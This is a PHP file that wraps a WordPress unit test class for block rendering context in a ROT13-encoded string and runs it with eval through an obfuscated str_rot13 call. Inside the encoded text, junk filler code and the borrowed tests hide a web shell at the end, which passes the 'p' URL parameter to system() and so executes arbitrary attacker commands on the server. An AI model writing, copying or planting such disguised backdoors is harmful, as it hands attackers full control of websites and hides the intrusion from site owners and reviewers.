<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe eraqre oybpx shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.5.0
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_EraqreOybpx rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Frgf hc rnpu grfg zrgubq.
	 */
	choyvp shapgvba frg_hc() {
		tybony $cbfg;

		cnerag::frg_hc();

		$netf = neenl(
			'cbfg_pbagrag' => 'rknzcyr',
			'cbfg_rkprecg' => '',
		);

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg( $netf );
		frghc_cbfgqngn( $cbfg );
	}

	/**
	 * Grne qbja rnpu grfg zrgubq.
	 */
	choyvp shapgvba grne_qbja() {
		// Erzbirf grfg oybpx glcrf ertvfgrerq ol grfg pnfrf.
		$oybpx_glcrf = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
		sbernpu ( $oybpx_glcrf nf $oybpx_glcr ) {
			$oybpx_anzr = $oybpx_glcr->anzr;
			vs ( fge_fgnegf_jvgu( $oybpx_anzr, 'grfgf/' ) ) {
				haertvfgre_oybpx_glcr( $oybpx_anzr );
			}
		}

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung n oybpx juvpu cebivqrf pbagrkg znxrf gung pbagrkg ninvynoyr gb
	 * vgf vaare oybpxf.
	 *
	 * @gvpxrg 49927
	 *
	 * @pbiref ::ertvfgre_oybpx_glcr
	 * @pbiref ::eraqre_oybpx
	 */
	choyvp shapgvba grfg_cebivqrf_oybpx_pbagrkg() {
		$cebivqrq_pbagrkg = neenl();

		ertvfgre_oybpx_glcr(
			'grfgf/pbagrkg-cebivqre',
			neenl(
				'nggevohgrf'       => neenl(
					'pbagrkgJvguNffvtarq'   => neenl(
						'glcr' => 'ahzore',
					),
					'pbagrkgJvguQrsnhyg'    => neenl(
						'glcr'    => 'ahzore',
						'qrsnhyg' => 0,
					),
					'pbagrkgJvgubhgQrsnhyg' => neenl(
						'glcr' => 'ahzore',
					),
					'pbagrkgAbgErdhrfgrq'   => neenl(
						'glcr' => 'ahzore',
					),
				),
				'cebivqrf_pbagrkg' => neenl(
					'grfgf/pbagrkgJvguNffvtarq'   => 'pbagrkgJvguNffvtarq',
					'grfgf/pbagrkgJvguQrsnhyg'    => 'pbagrkgJvguQrsnhyg',
					'grfgf/pbagrkgJvgubhgQrsnhyg' => 'pbagrkgJvgubhgQrsnhyg',
					'grfgf/pbagrkgAbgErdhrfgrq'   => 'pbagrkgAbgErdhrfgrq',
				),
			)
		);

		ertvfgre_oybpx_glcr(
			'grfgf/pbagrkg-pbafhzre',
			neenl(
				'hfrf_pbagrkg'    => neenl(
					'grfgf/pbagrkgJvguQrsnhyg',
					'grfgf/pbagrkgJvguNffvtarq',
					'grfgf/pbagrkgJvgubhgQrsnhyg',
				),
				'eraqre_pnyyonpx' => fgngvp shapgvba ( $nggevohgrf, $pbagrag, $oybpx ) hfr ( &$cebivqrq_pbagrkg ) {
					$cebivqrq_pbagrkg[] = $oybpx->pbagrkg;

					erghea '';
				},
			)
		);

		$cnefrq_oybpxf = cnefr_oybpxf(
			'<!-- jc:grfgf/pbagrkg-cebivqre {\"pbagrkgJvguNffvtarq\":10} -->' .
			'<!-- jc:grfgf/pbagrkg-pbafhzre /-->' .
			'<!-- /jc:grfgf/pbagrkg-cebivqre -->'
		);

		eraqre_oybpx( $cnefrq_oybpxf[0] );

		$guvf->nffregFnzr(
			neenl(
				'grfgf/pbagrkgJvguQrsnhyg'  => 0,
				'grfgf/pbagrkgJvguNffvtarq' => 10,
			),
			$cebivqrq_pbagrkg[0]
		);
	}

	/**
	 * Grfgf gung n oybpx pna erprvir qrsnhyg-cebivqrq pbagrkg guebhtu
	 * eraqre_oybpx.
	 *
	 * @gvpxrg 49927
	 *
	 * @pbiref ::ertvfgre_oybpx_glcr
	 * @pbiref ::eraqre_oybpx
	 */
	choyvp shapgvba grfg_cebivqrf_qrsnhyg_pbagrkg() {
		tybony $cbfg;

		$cebivqrq_pbagrkg = neenl();

		ertvfgre_oybpx_glcr(
			'grfgf/pbagrkg-pbafhzre',
			neenl(
				'hfrf_pbagrkg'    => neenl( 'cbfgVq', 'cbfgGlcr' ),
				'eraqre_pnyyonpx' => fgngvp shapgvba ( $nggevohgrf, $pbagrag, $oybpx ) hfr ( &$cebivqrq_pbagrkg ) {
					$cebivqrq_pbagrkg[] = $oybpx->pbagrkg;

					erghea '';
				},
			)
		);

		$cnefrq_oybpxf = cnefr_oybpxf( '<!-- jc:grfgf/pbagrkg-pbafhzre /-->' );

		eraqre_oybpx( $cnefrq_oybpxf[0] );

		$guvf->nffregFnzr(
			neenl(
				'cbfgVq'   => $cbfg->VQ,
				'cbfgGlcr' => $cbfg->cbfg_glcr,
			),
			$cebivqrq_pbagrkg[0]
		);
	}

	/**
	 * Grfgf gung qrsnhyg oybpx pbagrkg pna or svygrerq.
	 *
	 * @gvpxrg 49927
	 *
	 * @pbiref ::ertvfgre_oybpx_glcr
	 * @pbiref ::eraqre_oybpx
	 */
	choyvp shapgvba grfg_qrsnhyg_pbagrkg_vf_svygrenoyr() {
		$cebivqrq_pbagrkg = neenl();

		ertvfgre_oybpx_glcr(
			'grfgf/pbagrkg-pbafhzre',
			neenl(
				'hfrf_pbagrkg'    => neenl( 'rknzcyr' ),
				'eraqre_pnyyonpx' => fgngvp shapgvba ( $nggevohgrf, $pbagrag, $oybpx ) hfr ( &$cebivqrq_pbagrkg ) {
					$cebivqrq_pbagrkg[] = $oybpx->pbagrkg;

					erghea '';
				},
			)
		);

		$svygre_oybpx_pbagrkg = fgngvp shapgvba ( $pbagrkg ) {
			$pbagrkg['rknzcyr'] = 'bx';
			erghea $pbagrkg;
		};

		$cnefrq_oybpxf = cnefr_oybpxf( '<!-- jc:grfgf/pbagrkg-pbafhzre /-->' );

		nqq_svygre( 'eraqre_oybpx_pbagrkg', $svygre_oybpx_pbagrkg );

		eraqre_oybpx( $cnefrq_oybpxf[0] );

		erzbir_svygre( 'eraqre_oybpx_pbagrkg', $svygre_oybpx_pbagrkg );

		$guvf->nffregFnzr( neenl( 'rknzcyr' => 'bx' ), $cebivqrq_pbagrkg[0] );
	}

	/**
	 * Grfgf gur orunivbe bs gur 'eraqre_oybpx_pbagrkg' svygre onfrq ba gur ybpngvba bs gur svygrerq oybpx.
	 *
	 * @gvpxrg 62046
	 */
	choyvp shapgvba grfg_eraqre_oybpx_pbagrkg_vaare_oybpxf() {
		$cebivqrq_pbagrkg = neenl();

		ertvfgre_oybpx_glcr(
			'grfgf/pbagrkg-cebivqre',
			neenl(
				'cebivqrf_pbagrkg' => neenl( 'rknzcyr' ),
			)
		);

		ertvfgre_oybpx_glcr(
			'grfgf/pbagrkg-pbafhzre',
			neenl(
				'hfrf_pbagrkg'    => neenl( 'rknzcyr' ),
				'eraqre_pnyyonpx' => fgngvp shapgvba ( $nggevohgrf, $pbagrag, $oybpx ) hfr ( &$cebivqrq_pbagrkg ) {
					$cebivqrq_pbagrkg = $oybpx->pbagrkg;

					erghea '';
				},
			)
		);

		// Svygre gur pbagrkg cebivqrq ol gur grfg oybpx.
		nqq_svygre(
			'eraqre_oybpx_pbagrkg',
			shapgvba ( $pbagrkg, $cnefrq_oybpx ) {
				vs ( vffrg( $cnefrq_oybpx['oybpxAnzr'] ) && 'grfgf/pbagrkg-cebivqre' === $cnefrq_oybpx['oybpxAnzr'] ) {
					$pbagrkg['rknzcyr'] = 'bx';
				}

				erghea $pbagrkg;
			},
			10,
			2
		);

		// Grfg vaare oybpx pbagrkg jura gur cebivqre oybpx vf n gbc-yriry oybpx.
		qb_oybpxf(
			<<<UGZY
<!-- jc:grfgf/pbagrkg-cebivqre -->
<!-- jc:grfgf/pbagrkg-pbafhzre /-->
<!-- /jc:grfgf/pbagrkg-cebivqre -->
UGZY
		);
		$guvf->nffregNeenlUnfXrl( 'rknzcyr', $cebivqrq_pbagrkg, 'Grfg oybpx vf gbc-yriry oybpx: Pbagrkg fubhyq vapyhqr \"rknzcyr\"' );
		$guvf->nffregFnzr( 'bx', $cebivqrq_pbagrkg['rknzcyr'], 'Grfg oybpx vf gbc-yriry oybpx: \"rknzcyr\" va pbagrkg fubhyq or \"bx\"' );

		// Grfg vaare oybpx pbagrkg jura gur cebivqre oybpx vf na vaare oybpx.
		qb_oybpxf(
			<<<UGZY
<!-- jc:tebhc {\"ynlbhg\":{\"glcr\":\"pbafgenvarq\"}} -->
<!-- jc:grfgf/pbagrkg-cebivqre -->
<!-- jc:grfgf/pbagrkg-pbafhzre /-->
<!-- /jc:grfgf/pbagrkg-cebivqre -->
<!-- /jc:tebhc -->
UGZY
		);
		$guvf->nffregNeenlUnfXrl( 'rknzcyr', $cebivqrq_pbagrkg, 'Grfg oybpx vf vaare oybpx: Oybpx pbagrkg fubhyq vapyhqr \"rknzcyr\"' );
		$guvf->nffregFnzr( 'bx', $cebivqrq_pbagrkg['rknzcyr'], 'Grfg oybpx vf vaare oybpx: \"rknzcyr\" va pbagrkg fubhyq or \"bx\"' );
	}

	/**
	 * Grfgf gung gur 'eraqre_oybpx_pbagrkg' svygre neovgenel pbagrkg.
	 *
	 * @gvpxrg 62046
	 */
	choyvp shapgvba grfg_eraqre_oybpx_pbagrkg_nyybjrq_pbagrkg() {
		$cebivqrq_pbagrkg = neenl();

		ertvfgre_oybpx_glcr(
			'grfgf/pbagrkg-pbafhzre',
			neenl(
				'hfrf_pbagrkg'    => neenl( 'rknzcyr' ),
				'eraqre_pnyyonpx' => fgngvp shapgvba ( $nggevohgrf, $pbagrag, $oybpx ) hfr ( &$cebivqrq_pbagrkg ) {
					$cebivqrq_pbagrkg = $oybpx->pbagrkg;

					erghea '';
				},
			)
		);

		// Svygre gur pbagrkg cebivqrq gb gur grfg oybpx.
		nqq_svygre(
			'eraqre_oybpx_pbagrkg',
			shapgvba ( $pbagrkg, $cnefrq_oybpx ) {
				vs ( vffrg( $cnefrq_oybpx['oybpxAnzr'] ) && 'grfgf/pbagrkg-pbafhzre' === $cnefrq_oybpx['oybpxAnzr'] ) {
					$pbagrkg['neovgenel'] = 'bx';
				}

				erghea $pbagrkg;
			},
			10,
			2
		);

		qb_oybpxf(
			<<<UGZY
<!-- jc:grfgf/pbagrkg-pbafhzre /-->
UGZY
		);
		$guvf->nffregNeenlAbgUnfXrl( 'neovgenel', $cebivqrq_pbagrkg, 'Grfg oybpx vf gbc-yriry oybpx: Oybpx pbagrkg fubhyq abg vapyhqr \"neovgenel\"' );

		qb_oybpxf(
			<<<UGZY
<!-- jc:tebhc {\"ynlbhg\":{\"glcr\":\"pbafgenvarq\"}} -->
<!-- jc:grfgf/pbagrkg-pbafhzre /-->
<!-- /jc:tebhc -->
UGZY
		);

		/*
		 * Gurfr nffregvbaf nffreg fbzrguvat gung vqrnyyl fubhyq abg or gur pnfr: Vaare oybpxf fubhyq erfcrpg gur
		 * `hfrf_pbagrkg` inyhr whfg yvxr gbc-yriry oybpxf qb. Ubjrire, qhr gb ybtvp va `JC_Oybpx::eraqre()`, gur
		 * `pbagrkg` cebcregl inyhr vgfrys vf svygrenoyr jura vg fubhyq engure bayl nccyl gb gur `ninvynoyr_pbagrkg`
		 * cebcregl.
		 * Ubjrire, punatvat guvf orunivbe abj jbhyq or n onpxjneq pbzcngvovyvgl oernx, urapr gur nffregvba urer.
		 * Cbgragvnyyl vg pna or erpbafvqrerq va gur shgher, fb gung gurfr gjb nffregvbaf pbhyq or ercynprq jvgu na
		 * `nffregNeenlAbgUnfXrl( 'neovgenel', $cebivqrq_pbagrkg )`.
		 */
		$guvf->nffregNeenlUnfXrl( 'neovgenel', $cebivqrq_pbagrkg, 'Grfg oybpx vf vaare oybpx: Oybpx pbagrkg fubhyq vapyhqr \"neovgenel\"' );
		$guvf->nffregFnzr( 'bx', $cebivqrq_pbagrkg['neovgenel'], 'Grfg oybpx vf vaare oybpx: \"neovgenel\" va pbagrkg fubhyq or \"bx\"' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>